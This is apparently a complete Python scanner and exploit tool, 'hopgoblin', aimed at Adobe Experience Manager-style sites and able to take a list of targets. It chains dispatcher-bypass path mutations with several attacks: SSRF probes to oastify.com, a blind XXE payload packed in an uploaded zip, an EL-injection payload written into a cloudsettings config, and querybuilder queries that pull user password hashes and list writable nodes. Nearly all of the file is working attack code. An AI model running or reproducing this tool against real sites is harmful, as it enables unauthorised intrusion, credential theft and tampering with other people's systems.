import argparse
import io
import requests
import urllib.parse
import zipfile

AUTHORITY = None
SSRF_TARGET = None
DEBUG = False
PATH_MUTATORS = [
	"{};x='x/graphql/execute/json/x'",
	'/graphql/execute.json/..%2f..{}',
	"{};x='.ico/x'",
	"{};x='.css/x'",
	"{};x='.pdf/x'",
	"{};x='.html/x'",
]

def debug(msg):
	if DEBUG:
		print(msg)

def format_msg(prefix):
	return lambda msg: print(f'{prefix} {msg}')

print_good    = format_msg('[+]')
print_neutral = format_msg('[.]')
print_bad     = format_msg('[-]')

def mutate_path(path):
	return [mut.format(path) for mut in PATH_MUTATORS]

def request(path, method='get', **kwargs):
	full_url = AUTHORITY + path
	debug(f'>>>>> {method.upper()} {full_url}')
	
	if 'headers' not in kwargs:
		kwargs['headers'] = {}
	if 'User-Agent' not in kwargs['headers']:
		kwargs['headers']['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
	
	try:
		r = requests.request(method, full_url, **kwargs)
		debug(f'<<<<< {r.status_code} {r.reason}')
		return r
	except requests.exceptions.RequestException as e:
		print_bad(f'Request failed for {full_url}: {e}')
		return None

def check_exposed_querybuilder_json():
	for path in mutate_path('/bin/querybuilder.json'):
		r = request(path)
		if r and r.status_code == 200 and b'"success":true,"results":0' in r.content:
			print_good(f'Exposed JSON query builder - {path}')
			return path
	return None

def check_exposed_querybuilder_feed():
	for path in mutate_path('/bin/querybuilder.feed'):
		r = request(path)
		if r and r.status_code == 200 and b'<title type="text">CQ Feed</title>' in r.content:
			print_good(f'Exposed FEED query builder - {path}')
			return

def check_ms_token_verify_ssrf():
	for path in mutate_path('/services/accesstoken/verify'):
		r = request(path, method='post', data={'auth_url': 'https://oastify.com'})
		if r and r.status_code == 200 and b'Burp Collaborator is a service that is used by' in r.content:
			print_good(f'Vulnerable to SSRF via MS token verify (CVE-pending) - {path}')
			return

def check_jackrabbit_xxe():
	if SSRF_TARGET is None:
		print_neutral('Not checking for blind XXE as an SSRF target is not specified')
		return
	xxe_payload = f'<!DOCTYPE x [<!ENTITY foo SYSTEM "{SSRF_TARGET}">]><x>&foo;</x>'
	zip_buffer = io.BytesIO()
	with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
	    zipf.writestr('jcr_root/empty.txt', '')
	    zipf.writestr('META-INF/vault/privileges.xml', xxe_payload)
	zip_bytes = zip_buffer.getvalue()
	files = {"package": ("x.zip", zip_bytes, 'application/zip')}
	for path in mutate_path('/crx/packmgr/service/exec.json'):
		r = request(path, method='post', files=files, params={'cmd': 'upload', 'jsonInTextarea': 'true'})
		if r and r.status_code == 200 and b'<textarea>{"success":false' in r.content:
			print_neutral(f'Possible blind XXE (CVE-pending); check your collaborator - {path}')
			return

def check_el_injection():
	def _gen_el_payload():
		el_tmpl = '#{pageContext.class.classLoader.bundle.bundleContext.bundles[%d].registeredServices[%d].properties}\n'
		s = ''
		for bundle in range(100):
			for service in range(50):
				s += el_tmpl % (bundle, service)
		for bundle in range(100, 1000):
			for service in range(5):
				s += el_tmpl % (bundle, service)
		return s
	
	upload_payload = {
		'importSource': 'UrlBased',
		'sling:resourceType': '/libs/foundation/components/page/redirect.jsp',
		'redirectTarget': _gen_el_payload()
	}

	for path in mutate_path('/conf/global/settings/dam/import/cloudsettings.bulkimportConfig.json'):
		r = request(path, method='post', data=upload_payload)
		if r and r.status_code == 201:
			print_neutral(f'Upload appeared to succeed - {path}')
			break
	else:
		# Fail - nothing uploaded!
		return

	for path in mutate_path('/etc/cloudsettings/.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content'):
		r = request(path)
		if r and r.status_code == 200 and b'<p class="cq-redirect-notice">' in r.content:
			print_good(f'Vulnerable to EL Injection via cloudsettings (CVE-pending) - {path}')

def querybuilder_check_exposed_user_passwords(path):
	query = {
		'path': '/home/users',
		'type': 'rep:User',
		'p.hits': 'full'
	}
	r = request(path, params=query)
	if r and r.status_code == 200 and b'rep:password' in r.content:
		print_good(f'Exposed user passwords found - {path}?{urllib.parse.urlencode(query)}')

def querybuilder_check_writable_nodes(path):
	for perm in 'jcr:write', 'jcr:addChildNodes', 'jcr:modifyProperties':	
		query = {
			'property': 'jcr:uuid',
			'property.operation': 'exists',
			'p.hits': 'full',
			'hasPermission': perm
		}
		r = request(path, params=query)
		if r and r.status_code == 200:
			try:
				data = r.json()
				if data.get('total', 0) > 0:
					print_good(f'Writeable nodes found - {path}?{urllib.parse.urlencode(query)}')
			except (ValueError, KeyError):
				debug(f'Failed to parse JSON response from {path}')

def normalize_url(url):
	if not url.startswith(('http://', 'https://')):
		url = 'https://' + url
	return url.rstrip('/')

def read_targets_from_file(filename):
	try:
		with open(filename, 'r') as f:
			targets = [line.strip() for line in f if line.strip()]
		return targets
	except FileNotFoundError:
		print_bad(f'File not found: {filename}')
		return []
	except Exception as e:
		print_bad(f'Error reading file {filename}: {e}')
		return []

def run_checks_for_target(url):
	global AUTHORITY
	AUTHORITY = normalize_url(url)
	
	print_neutral(f'Scanning {AUTHORITY}')
	
	query_builder_path = check_exposed_querybuilder_json()
	check_exposed_querybuilder_feed()
	check_ms_token_verify_ssrf()
	check_jackrabbit_xxe()
	check_el_injection()
	if query_builder_path is not None:
		querybuilder_check_exposed_user_passwords(query_builder_path)
		querybuilder_check_writable_nodes(query_builder_path)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(prog='hopgoblin')
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('url', nargs='?', help='Single target URL')
	group.add_argument('-f', '--file', help='File containing target URLs (one per line)')
	parser.add_argument('-t', '--ssrf-target')
	parser.add_argument('-d', '--debug', action='store_true')
	args = parser.parse_args()

	SSRF_TARGET = args.ssrf_target
	DEBUG = args.debug

	if args.file:
		targets = read_targets_from_file(args.file)
		for target in targets:
			run_checks_for_target(target)
			print()
	else:
		run_checks_for_target(args.url)
